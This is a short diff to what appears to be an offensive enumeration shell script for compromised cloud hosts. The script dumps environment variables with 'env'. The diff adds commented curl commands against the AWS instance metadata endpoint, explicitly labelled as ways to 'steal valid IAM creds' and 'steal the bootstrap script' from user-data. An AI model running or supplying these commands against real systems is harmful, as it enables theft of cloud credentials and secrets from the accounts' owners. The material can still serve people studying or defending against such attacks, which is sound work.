@@ -18,3 +18,11 @@ echo $'\n\n'
 
 echo "Dumping environment variables with 'env'"
 env
+
+# If you can steal valid IAM creds, use them
+# https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_use-resources.html
+# Use export to set session variables to access keys and tokens
+# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# 
+# Steal the bootstrap script with the following
+# curl http://169.254.169.254/latest/meta-data/latest/user-data/
